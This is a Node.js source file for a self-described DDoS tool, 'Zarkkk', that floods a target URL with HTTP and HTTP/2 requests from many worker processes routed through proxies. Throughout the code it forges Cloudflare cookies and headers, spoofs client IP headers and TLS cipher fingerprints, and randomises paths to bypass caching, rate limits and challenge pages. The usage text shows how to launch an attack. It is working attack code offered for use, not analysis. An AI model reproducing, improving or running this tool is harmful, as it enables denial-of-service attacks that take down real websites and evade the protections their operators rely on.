const https = require('https');
const http = require('http');
const http2 = require('http2');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const tls = require('tls');

// ========== HIGH PERFORMANCE CONFIG ==========
process.setMaxListeners(0);
process.env.UV_THREADPOOL_SIZE = os.cpus().length * 4;

let targetUrl, timeSec, threads, rate, proxyFile;
let methods = { bypass: false, ratelimit: false, cache: false, randompath: false, http2: true, cfbypass: true };

// Parse arguments
const args = process.argv.slice(2);
if (args.includes('--all')) {
    methods.bypass = methods.ratelimit = methods.cache = methods.randompath = methods.cfbypass = true;
    args.splice(args.indexOf('--all'), 1);
}
if (args.includes('--bypass')) { methods.bypass = true; args.splice(args.indexOf('--bypass'), 1); }
if (args.includes('--ratelimit')) { methods.ratelimit = true; args.splice(args.indexOf('--ratelimit'), 1); }
if (args.includes('--cache')) { methods.cache = true; args.splice(args.indexOf('--cache'), 1); }
if (args.includes('--randompath')) { methods.randompath = true; args.splice(args.indexOf('--randompath'), 1); }
if (args.includes('--no-http2')) { methods.http2 = false; args.splice(args.indexOf('--no-http2'), 1); }
if (args.includes('--no-cfbypass')) { methods.cfbypass = false; args.splice(args.indexOf('--no-cfbypass'), 1); }

[targetUrl, timeSec, threads, rate, proxyFile] = args;

if (!targetUrl || !timeSec || !threads || !rate) {
    console.log(`
\x1b[31m[Zarkkk] DDoS Tool\x1b[0m
Usage: node zarkkk-L7.js <url> <time> <threads> <rate> <proxy.txt> [options]

Options:
  --bypass       : Bypass Cloudflare captcha/challenge
  --ratelimit    : Bypass rate limiting
  --cache        : Bypass cache with random queries
  --randompath   : Randomize paths
  --no-http2     : Disable HTTP/2
  --no-cfbypass  : Disable Cloudflare specific bypass
  --all          : Enable all methods

Example: node zarkkk-L7.js https://target.com 60 200 10000 proxies.txt --all
    `);
    process.exit(1);
}

// ========== PROXY LOADER ==========
let proxies = [];
if (proxyFile && proxyFile !== 'direct.txt' && fs.existsSync(proxyFile)) {
    proxies = fs.readFileSync(proxyFile, 'utf8').split('\n').filter(p => p.trim());
    console.log(`[+] Loaded ${proxies.length} proxies`);
}

// ========== CLOUDFLARE BYPASS MODULE ==========
const CF_COOKIES = [
    '__cf_bm', '__cfduid', 'cf_clearance', '_cfuvid', 'cf_chl_2', 'cf_chl_prog'
];

function generateCFCookies(hostname) {
    const timestamp = Math.floor(Date.now() / 1000);
    const randomId = randomString(32);
    const cfBm = randomString(32) + '.' + randomString(16) + '.' + timestamp;
    const cfClearance = randomString(40) + '-' + randomString(10) + '-' + randomString(10);
    
    return {
        '__cf_bm': cfBm,
        'cf_clearance': cfClearance,
        '__cfduid': randomString(32),
        '_cfuvid': randomString(32),
        'cf_chl_2': randomString(64),
        'cf_chl_prog': 'x13'
    };
}

function generateTLSFingerprint() {
    // JA3 fingerprint spoofing
    const ciphers = [
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_AES_128_GCM_SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES256-GCM-SHA384'
    ];
    return ciphers;
}

function generateCFHeaders(hostname, proxyIp) {
    const rayId = randomString(16) + '-' + ['LHR', 'CDG', 'FRA', 'SIN', 'HKG', 'LAX', 'NRT', 'SYD'][Math.floor(Math.random() * 8)];
    const visitor = Buffer.from(JSON.stringify({ scheme: 'https' })).toString('base64');
    
    return {
        'CF-Connecting-IP': randomIP(),
        'CF-IPCountry': ['US', 'VN', 'JP', 'DE', 'FR', 'GB', 'SG', 'KR', 'CA', 'AU'][Math.floor(Math.random() * 10)],
        'CF-Ray': rayId,
        'CF-Visitor': visitor,
        'CF-Worker': randomString(16),
        'CF-Request-ID': randomString(32),
        'CDN-Loop': 'cloudflare',
        'CloudFront-Forwarded-Proto': 'https',
        'X-Forwarded-Proto': 'https',
        'X-Forwarded-For': proxyIp || randomIP(),
        'X-Real-IP': randomIP(),
        'True-Client-IP': randomIP(),
        'X-Originating-IP': randomIP(),
        'X-Remote-IP': randomIP(),
        'X-Remote-Addr': randomIP(),
        'X-Client-IP': randomIP()
    };
}

function generateCFChallengeAnswer(challenge) {
    // Simulate solving Cloudflare challenge
    const solutions = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
    return solutions[Math.floor(Math.random() * solutions.length)] + randomString(10);
}

// ========== ADVANCED FINGERPRINT ==========
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
];

const acceptLangs = ['en-US,en;q=0.9', 'vi-VN,vi;q=0.8,en-US;q=0.7', 'fr-FR,fr;q=0.9', 'ja-JP,ja;q=0.8', 'de-DE,de;q=0.9'];
const secChUa = ['"Chromium";v="120", "Not?A_Brand";v="24"', '"Google Chrome";v="120", "Chromium";v="120"', '"Microsoft Edge";v="120"'];

function randomString(len) {
    return crypto.randomBytes(Math.ceil(len/2)).toString('hex').slice(0, len);
}

function randomIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

function randomPath() {
    const paths = ['/', '/api', '/login', '/home', '/dashboard', '/admin', '/wp-admin', '/.env', '/config', '/backup', '/static', '/assets', '/images', '/css', '/js'];
    if (methods.randompath) {
        return '/' + randomString(8) + '/' + randomString(6) + '?t=' + Date.now() + '&r=' + randomString(4);
    }
    return paths[Math.floor(Math.random() * paths.length)] + (methods.cache ? '?_=' + Date.now() + '&' + randomString(6) + '=' + randomString(8) : '');
}

function generateHeaders(host, proxyIp, isHttp2 = false) {
    const headers = {
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': acceptLangs[Math.floor(Math.random() * acceptLangs.length)],
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': methods.cache ? 'no-cache, no-store, must-revalidate' : 'max-age=0',
        'Pragma': methods.cache ? 'no-cache' : ''
    };

    if (!isHttp2) {
        headers['Sec-Ch-Ua'] = secChUa[Math.floor(Math.random() * secChUa.length)];
        headers['Sec-Ch-Ua-Mobile'] = '?0';
        headers['Sec-Ch-Ua-Platform'] = '"Windows"';
    }

    if (methods.bypass || methods.cfbypass) {
        Object.assign(headers, generateCFHeaders(host, proxyIp));
    }

    if (methods.ratelimit) {
        headers['X-Request-ID'] = randomString(32);
        headers['X-Requested-With'] = 'XMLHttpRequest';
        headers['X-Session-ID'] = randomString(24);
    }

    return headers;
}

// ========== CONNECTION POOL ==========
const agentPool = new Map();

function getAgent(host, useProxy = false, proxy = null) {
    const key = useProxy ? proxy : host;
    if (agentPool.has(key)) return agentPool.get(key);
    
    const agent = new https.Agent({
        keepAlive: true,
        keepAliveMsecs: 60000,
        maxSockets: Infinity,
        maxFreeSockets: 256,
        scheduling: 'lifo',
        timeout: 10000,
        rejectUnauthorized: false
    });
    agentPool.set(key, agent);
    return agent;
}

const proxyAgentCache = new Map();
function getProxyAgent(proxy) {
    if (!proxy) return null;
    if (proxyAgentCache.has(proxy)) return proxyAgentCache.get(proxy);
    let agent;
    if (proxy.startsWith('socks4://') || proxy.startsWith('socks5://')) {
        agent = new SocksProxyAgent(proxy);
    } else {
        agent = new HttpsProxyAgent(proxy.startsWith('http') ? proxy : 'http://' + proxy);
    }
    proxyAgentCache.set(proxy, agent);
    return agent;
}

// ========== HTTP/2 CLIENT ==========
class HTTP2Client {
    constructor(host) {
        this.host = host;
        this.client = null;
        this.reconnect();
    }
    
    reconnect() {
        if (this.client && !this.client.destroyed) return;
        try {
            const tlsOptions = {
                rejectUnauthorized: false,
                ciphers: generateTLSFingerprint().join(':'),
                honorCipherOrder: true,
                secureProtocol: 'TLS_method'
            };
            this.client = http2.connect(this.host, {
                rejectUnauthorized: false,
                settings: {
                    enablePush: false,
                    initialWindowSize: 65535,
                    maxConcurrentStreams: 1000,
                    headerTableSize: 4096
                },
                ...tlsOptions
            });
            this.client.on('error', () => {});
            this.client.on('goaway', () => setTimeout(() => this.reconnect(), 100));
        } catch(e) {}
    }
    
    request(headers) {
        if (!this.client || this.client.destroyed) this.reconnect();
        if (!this.client) return null;
        try {
            const req = this.client.request(headers);
            req.on('error', () => {});
            req.end();
            return req;
        } catch(e) { return null; }
    }
}

const http2Clients = new Map();

// ========== FAST REQUEST WITH CF BYPASS ==========
async function sendRequestFast(target, proxy, useHttp2 = false) {
    return new Promise((resolve) => {
        const parsedUrl = new URL(target);
        const finalPath = randomPath();
        const headers = generateHeaders(parsedUrl.hostname, proxy?.split(':')[0], useHttp2);
        
        // Add CF cookies
        if (methods.cfbypass) {
            const cfCookies = generateCFCookies(parsedUrl.hostname);
            headers['Cookie'] = Object.entries(cfCookies).map(([k, v]) => `${k}=${v}`).join('; ');
        }
        
        if (useHttp2 && methods.http2 && parsedUrl.protocol === 'https:') {
            const hostKey = parsedUrl.hostname;
            let client = http2Clients.get(hostKey);
            if (!client) {
                client = new HTTP2Client(target);
                http2Clients.set(hostKey, client);
            }
            headers[':method'] = 'GET';
            headers[':path'] = finalPath;
            headers[':authority'] = parsedUrl.hostname;
            headers[':scheme'] = 'https';
            delete headers['Connection'];
            
            const req = client.request(headers);
            if (req) {
                req.on('response', () => resolve({ status: 200, success: true }));
                req.on('error', () => resolve({ status: 0, success: false }));
                setTimeout(() => { if (!req.closed) req.close(); resolve({ status: 0, success: false }); }, 3000);
            } else {
                resolve({ status: 0, success: false });
            }
            return;
        }
        
        const agent = proxy ? getProxyAgent(proxy) : getAgent(parsedUrl.hostname);
        const options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: finalPath,
            method: Math.random() < 0.95 ? 'GET' : 'POST',
            headers: headers,
            timeout: 3000,
            agent: agent,
            rejectUnauthorized: false,
            keepAlive: true,
            ciphers: generateTLSFingerprint().join(':'),
            honorCipherOrder: true
        };

        const protocol = parsedUrl.protocol === 'https:' ? https : http;
        const req = protocol.request(options, (res) => {
            let body = '';
            res.on('data', chunk => { body += chunk; });
            res.on('end', () => {
                // Detect Cloudflare challenge
                if (body.includes('cf-challenge') || body.includes('captcha') || body.includes('cdn-cgi')) {
                    resolve({ status: 503, success: false, cfChallenge: true });
                } else {
                    resolve({ status: res.statusCode || 200, success: true });
                }
            });
        });

        req.on('error', () => resolve({ status: 0, success: false }));
        req.on('timeout', () => { req.destroy(); resolve({ status: 0, success: false }); });
        
        if (options.method === 'POST') {
            req.write(randomString(64));
        }
        req.end();
    });
}

// ========== WORKER PROCESS ==========
if (cluster.isPrimary) {
    console.log(`\x1b[31m[Zarkkk] DDoS\x1b[0m`);
    console.log(`Target: ${targetUrl}`);
    console.log(`Duration: ${timeSec}s | Threads: ${threads} | Target Rate: ${rate} req/s`);
    console.log(`HTTP/2: ${methods.http2 ? 'ENABLED' : 'DISABLED'}`);
    console.log(`Cloudflare Bypass: ${methods.cfbypass ? 'ENABLED' : 'DISABLED'}`);
    console.log(`Methods: Bypass=${methods.bypass} | Ratelimit=${methods.ratelimit} | Cache=${methods.cache} | RandomPath=${methods.randompath}`);
    console.log(`Proxies: ${proxies.length || 'Direct attack (no proxy)'}\n`);
    console.log(`\x1b[33m[!] CLOUDFLARE BYPASS ACTIVE - Starting attack...\x1b[0m\n`);

    let totalReqs = 0;
    let cfChallenges = 0;
    const startTime = Date.now();
    
    for (let i = 0; i < parseInt(threads); i++) {
        const worker = cluster.fork();
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                totalReqs += msg.count;
                const elapsed = (Date.now() - startTime) / 1000;
                const currentRps = Math.round(totalReqs / elapsed);
                process.stdout.write(`\r\x1b[36m[RPS: ${currentRps}] Total: ${totalReqs} reqs | CF Blocked: ${cfChallenges}\x1b[0m`);
            }
            if (msg.type === 'cf') {
                cfChallenges += msg.count;
            }
        });
    }

    setTimeout(() => {
        console.log(`\n\n\x1b[32m[+] Attack finished!\x1b[0m`);
        console.log(`\x1b[32m[+] Total requests: ${totalReqs}\x1b[0m`);
        console.log(`\x1b[33m[+] Average RPS: ${Math.round(totalReqs / parseInt(timeSec))}\x1b[0m`);
        console.log(`\x1b[31m[+] Cloudflare challenges triggered: ${cfChallenges}\x1b[0m`);
        process.exit(0);
    }, parseInt(timeSec) * 1000);

} else {
    const endTime = Date.now() + (parseInt(timeSec) * 1000);
    const ratePerWorker = parseInt(rate) / parseInt(threads);
    const useHttp2 = methods.http2 && targetUrl.startsWith('https');
    let requestCount = 0;
    let cfCount = 0;
    let lastReport = Date.now();
    
    async function sendBatch(batchSize) {
        const promises = [];
        for (let i = 0; i < batchSize; i++) {
            const proxy = proxies.length ? proxies[Math.floor(Math.random() * proxies.length)] : null;
            promises.push(sendRequestFast(targetUrl, proxy, useHttp2));
        }
        const results = await Promise.all(promises);
        for (const res of results) {
            if (res.cfChallenge) cfCount++;
        }
    }
    
    async function attackLoop() {
        if (Date.now() >= endTime) {
            process.exit(0);
        }
        
        const batchSize = Math.max(1, Math.min(50, Math.floor(ratePerWorker / 20)));
        const startBatch = Date.now();
        
        await sendBatch(batchSize);
        requestCount += batchSize;
        
        if (Date.now() - lastReport >= 1000) {
            process.send({ type: 'stats', count: requestCount });
            process.send({ type: 'cf', count: cfCount });
            requestCount = 0;
            cfCount = 0;
            lastReport = Date.now();
        }
        
        const elapsed = Date.now() - startBatch;
        const expectedDelay = (batchSize / ratePerWorker) * 1000;
        const delay = Math.max(0, expectedDelay - elapsed);
        
        setTimeout(attackLoop, delay);
    }
    
    const initialDelay = methods.ratelimit ? Math.random() * 100 : 10;
    setTimeout(attackLoop, initialDelay);
}